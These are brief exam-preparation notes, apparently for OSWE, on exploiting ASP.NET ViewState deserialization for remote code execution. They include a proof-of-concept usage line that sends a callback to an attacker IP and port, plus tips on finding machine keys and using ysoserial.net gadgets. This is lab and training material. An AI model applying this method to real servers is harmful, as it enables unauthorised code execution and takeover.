# .NET ViewState Deserialization RCE PoC Notes

## Vulnerability Summary
- **Target**: ASP.NET applications with ViewState
- **Type**: Insecure ViewState deserialization → RCE
- **Impact**: Remote code execution

## Key Concepts
ViewState is ASP.NET's mechanism for preserving page state. If machine keys are known or weak, attackers can craft malicious ViewState to achieve RCE.

## Lab Setup
```bash
# DotNetNuke 9.1.1 (vulnerable)
# Or custom ASP.NET application
```

## Quick Usage
```bash
python3 poc.py 192.168.1.10 80 10.10.14.5 4444 \\
  --machine-key <KEY> --validation-key <KEY>
```

## OSWE Exam Tips
- Look for machine keys in web.config
- Default keys are exploitable
- Use ysoserial.net with ObjectDataProvider gadget
- ViewState always starts with "/wEP" when base64 encoded

## References
- ysoserial.net: https://github.com/pwntester/ysoserial.net
- Blackhat Paper: https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf
